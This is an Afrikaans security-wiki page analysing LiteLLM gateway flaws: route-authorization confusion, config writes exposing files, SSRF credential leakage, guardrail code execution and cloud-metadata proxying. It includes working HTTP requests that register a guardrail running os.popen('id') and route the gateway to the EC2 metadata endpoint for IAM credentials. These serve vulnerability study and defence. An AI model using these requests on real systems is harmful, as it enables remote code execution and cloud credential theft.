# LLM Gateway Vertrouensgrense

{{#include ../banners/hacktricks-training.md}}

'n LLM gateway hanteer modelroetering en hou dikwels verskafferbewyse, dus moet gewone API-oproepers nie konfigurasie- of verskaffervlak-gesag erf nie. Die LiteLLM-gateway-assessering op weergawe 1.77.7 illustreer twee afsonderlike grense: UI-sessie-autorisasie vir administratiewe konfigurasie en roeteringskonfigurasie wat deur die oproeper verskaf word vir inferensie. Die gerapporteerde probleme is in weergawe 1.83.9 reggestel.<sup>[[1]](#references)</sup>

## UI-roeteklassifikasie is nie autorisasie nie

In die geassesseerde LiteLLM-weergawe het UI-aanmeldsleutels aan die `litellm-dashboard`-span behoort. Autorisasie het 'n sleutel as 'n UI-token geklassifiseer op grond van daardie spanidentifiseerder, ongeag die gebruiker se rol. Die UI-roetekontrole het daarna enige roete aanvaar wat met 'n toegelate voorvoegsel begin het. Gevolglik het die `/config`-inskrywing ook met die administratiewe `/config/update`-handler ooreengestem. Daardie handler het generiese verifikasie vereis, maar nie onafhanklik `PROXY_ADMIN` vereis nie, en daarom het 'n UI-sessie met laer voorregte toegang tot konfigurasieskryfregte verkry.<sup>[[1]](#references)</sup>

Dit verskil van 'n wanpassing in proxy-/backend-padnormalisering: die autorisasiekode en handler stem nie saam oor die gesag van *dieselfde* roete nie.<sup>[[1]](#references)</sup> Vergelyk tydens 'n gateway-oorsig die tokenklassifikasie, presiese roete- en metodepassing, en die handler se eie rolkontrole.<sup>[[1]](#references)</sup> Sien [web API-autorisasie](../pentesting-web/web-api-pentesting.md), [401/403-omseilings](../pentesting-web/403-and-401-bypasses.md), en [proxy-voorvoegselvrystellings](../pentesting-web/proxy-waf-protections-bypass.md#prefix-exemptions-become-routing-keys) vir verwante, maar afsonderlike grense.

## Konfigurasieskryfbewerkings bereik meer as die konfigurasiewinkel

Dieselfde LiteLLM-konfigurasieopdatering het omgewingsveranderlikewaardes aanvaar en dit op die lopende proses toegepas. Een verbruiker het `UI_LOGO_PATH` as 'n plaaslike pad vir 'n `FileResponse` hanteer, sonder om te valideer dat dit na 'n logo verwys; 'n ander het `UI_USERNAME` en `UI_PASSWORD` tydens nie-SSO-aanmelding gelees en `PROXY_ADMIN` toegeken wanneer hulle ooreengestem het. 'n Konfigurasieskryftoestemming kon dus, afhangend van die stroomafverbruiker, beide plaaslike lêerblootlegging en 'n administratiewe identiteitsverandering moontlik maak. Die antwoord se mediatipe bevestig nie dat 'n bediende lêer 'n beeld is nie.<sup>[[1]](#references)</sup>

Die deurlaatkonfigurasie vir die eindpunt was nog 'n stroomafsink. Inisialisering het afgeleë S3/GCS-adapterteikens aanvaar, Python-modules afgelaai en dit met `importlib` se `exec_module` ingevoer. Invoer voer topvlak-kode uit voordat 'n adapterinstansie gebruik word; om bloot die adapter se aanroep te beperk, verwyder nie daardie uitvoeringsgrens nie. Hanteer dit as konfigurasiebeheerde kode-laai, nie as deserialisering van modelleêrs nie.<sup>[[1]](#references)</sup> Vir die afsonderlike lêerleesprimitief, sien [lêerinsluiting en padtraversering](../pentesting-web/file-inclusion/).

## Modelroetering per versoek kan gateway-bewyse leak

LiteLLM se kliëntkant-bewysfunksie het 'n `user_config`-objek in 'n LLM-versoek aanvaar. Die geassesseerde roete het 'n tydelike `litellm.Router` uit daardie objek geskep, insluitend sy modellista en verskaffer se `api_base`. 'n Verskafferbestemming wat deur die oproeper beheer word, kon die gateway se uitgaande voltooiingsversoek en gekonfigureerde verskaffer-verifikasieopskrifte ontvang. Beperkings op topvlak-`api_base`- of `api_key`-velde het nie hierdie afsonderlike geneste konfigurasiepad gedek nie. Dit is 'n SSRF-grens wat bewysdraend is, eerder as 'n prompt-injection-probleem.<sup>[[1]](#references)</sup>

Vergelyk tydens 'n gemagtigde gateway-assessering elke pad wat 'n router of verskafferkliënt kan skep, insluitend konfigurasie per versoek, met die bestemmings- en bewysbeleid wat deur die normaal gekonfigureerde roete gebruik word.<sup>[[1]](#references)</sup> Die [SSRF-gids](../pentesting-web/ssrf-server-side-request-forgery/) behandel algemene beheer oor bestemmings aan die bedienerkant; die gateway-spesifieke fout is om 'n minder betroubare versoekobjek toe te laat om 'n bestemming te kies terwyl bevoorregte uitgaande bewyse hergebruik word.<sup>[[1]](#references)</sup>

## Guardrail-registrasie kan 'n sandbox omseil wat net vir die UI geld

'n Gateway se kode-toetspad en kode-registrasiepad kan verskillende validering hê. In LiteLLM voor v1.82.0 het die UI se toets vir pasgemaakte guardrails gevaarlike sintaksis verwerp en met `__builtins__ = {}` uitgevoer, maar `POST /guardrails` het die ingediende `custom_code` met `exec(compile(...), exec_globals)` saamgestel sonder enige van dié kontroles. Python voeg builtins by 'n globals-woordeboek in wat nie `__builtins__` bevat nie, en daarom is invoere en opdragte op modulevlak uitgevoer **toe die guardrail geregistreer is**, voordat enige inferensie-oproep plaasgevind het. Die latere `apply_guardrail`-terugroep kon 'n gestoorde resultaat deur sy blokkeerrede blootlê.<sup>[[2]](#references)[[3]](#references)</sup>

Vergelyk tydens 'n gemagtigde toets die toets- en registrasiehandlers eerder as om aan te neem dat 'n suksesvolle UI-sandboxtoets bewys dat registrasie veilig is. Die gerapporteerde versoekvorm voor die regstelling was:<sup>[[2]](#references)</sup>

```http
POST /guardrails HTTP/1.1
Authorization: Bearer <master_key>
Content-Type: application/json

{
  "guardrail": {
    "guardrail_name": "probe",
    "litellm_params": {
      "guardrail": "custom_code", "mode": "pre_call", "default_on": true,
      "custom_code": "import os\nresult = os.popen('id').read()\ndef apply_guardrail(inputs, request_data, input_type):\n    return {'action': 'block', 'reason': result}"
    }
  }
}
```

Die registrasie-endpoint het ook gewone API-sleutels aanvaar omdat dit nie ’n `PROXY_ADMIN`-kontrole gehad het nie. Waar geen master key- of JWT/OAuth2-verifikasie opgestel was nie, het die auth-handler voor die regstelling selfs aan anonieme versoeke die `PROXY_ADMIN`-rol toegeken. Die regstelling het die rol sonder verifikasie na `INTERNAL_USER` verander, guardrail-admin-kontroles bygevoeg en ingeboude funksies tydens registrasie bekragtig en beperk. Hierdie rol- en kode-uitvoeringsgrense staan los van die [MCP token-fallback-kwessie](AI-MCP-Servers.md#mcp-token-passthrough-must-not-create-an-anonymous-session).<sup>[[2]](#references)[[3]](#references)</sup>

## Admin-pass-through-roetes kan cloud metadata proxieer

LiteLLM se pass-through-endpoint-funksie laat ’n administrateur toe om ’n HTTP-teiken op te stel en opsioneel subpaaie by te voeg. Anders as die bogenoemde roeteringskwessie met `user_config` per versoek, vereis dit **skryfbevoegdheid vir konfigurasie**; die funksie is self bedoel om administrateurs te vertrou. In die gerapporteerde ontplooiing is die teiken nie teen private of skakelplaaslike adresse gekontroleer nie.<sup>[[2]](#references)[[4]](#references)</sup> Voor v1.83.0 kon gewone geverifieerde sleutels ook `/config/update` bereik omdat dit nie ’n administrateurrolkontrole gehad het nie; sien [UI-roeteklassifikasie](#ui-route-classification-is-not-authorization) vir die verwante grens vir konfigurasieskryfbevoegdheid.<sup>[[2]](#references)[[6]](#references)</sup>

Met daardie bevoegdheid en netwerkbereikbaarheid vanaf die proxy na EC2-metadata, stel ’n roete soos die volgende metadata deur die gateway bloot. Die `include_subpath`-vlag laat `/meta/meta-data/iam/security-credentials/` onder `/latest/` karteer.<sup>[[2]](#references)[[4]](#references)</sup>

```http
POST /config/pass_through_endpoint HTTP/1.1
Authorization: Bearer <master_key>
Content-Type: application/json

{"path":"/meta","target":"http://169.254.169.254/latest/","headers":{},"include_subpath":true}
```

Die [Cloud SSRF guide](../pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.md#aws) dek die IMDSv2-tokenuitruiling; hierdie roete moet die `PUT`-versoek toelaat en albei metadata-opskrifte deurgee.<sup>[[5]](#references)</sup> LiteLLM se generiese hantering van deurgangsopskrifte verwyder die `x-pass-`-voorvoegsel voordat dit aangestuur word, dus kan `x-pass-X-aws-ec2-metadata-token-ttl-seconds: 21600` en `x-pass-X-aws-ec2-metadata-token: <token>` daardie opskrifte verskaf.<sup>[[2]](#references)[[7]](#references)</sup> Die proxy moet IMDS kan bereik, die tokenrespons moet die gekonfigureerde hop limit deurkruis, en die tokenversoek mag nie `X-Forwarded-For` bevat nie.<sup>[[5]](#references)</sup> Die gateway-spesifieke variasie is die **admin-beheerde volgehoue roete plus versoekopskrif-deurgif**.

## References

- [1] [Check Point Research — Wanneer LLM-gateways verkeerd loop: bevindings oor LiteLLM](https://research.checkpoint.com/2026/when-llm-gateways-go-wrong-findings-from-litellm/)
- [2] [Wiz — Onkant gevang: LiteLLM gebreek, van verifikasie-omseiling tot wolkkompromittering](https://wiz.io/blog/off-guard-breaking-litellm-from-authentication-bypass-to-cloud-compromise)
- [3] [LiteLLM PR #22095 — herstel van ongeverifieerde RCE en sandbox-ontsnapping in aangepaste kode-guardrail](https://github.com/BerriAI/litellm/pull/22095)
- [4] [LiteLLM — Skep deurgangseindpunte](https://docs.litellm.ai/docs/proxy/pass_through)
- [5] [AWS — Hoe Instansiemetadata-diens weergawe 2 werk](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html)
- [6] [LiteLLM-advies — onbeperkte proxy-konfigurasie-eindpunt](https://github.com/advisories/GHSA-53mr-6c8q-9789)
- [7] [LiteLLM-implementering van deurgang-opskrifaanstuur](https://github.com/BerriAI/litellm/blob/v1.84.0/litellm/passthrough/utils.py)
{{#include ../banners/hacktricks-training.md}}
